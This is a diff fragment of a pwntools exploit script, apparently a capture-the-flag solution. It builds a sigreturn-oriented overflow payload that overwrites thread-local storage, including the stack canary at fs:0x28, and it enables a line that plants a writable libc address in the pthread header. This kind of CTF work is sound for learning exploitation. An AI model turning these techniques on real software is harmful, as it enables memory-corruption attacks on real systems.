@@ -93,7 +93,7 @@ frame.rip=syscall
 p.sendlineafter(b"size of message:",b"2400")
 payload_1=b"A"*120+p64(0x0000000000401016)+p64(pop_rax)+p64(0xf)+p64(syscall)+bytes(frame) #srop payload
 payload_1+=b"A"*(2192-len(payload_1)) #we overwriting all the way to tls
-#payload_1+=p64(addr+0x01d66c8) #writeable libc addr at pthread struct self header
+payload_1+=p64(addr+0x01d66c8) #writeable libc addr at pthread struct self header
 payload_1+=(2216-len(payload_1))*b"A" #then just overwrite the rest of tls including fs:0x28
 payload_1+=b"A"*8
 
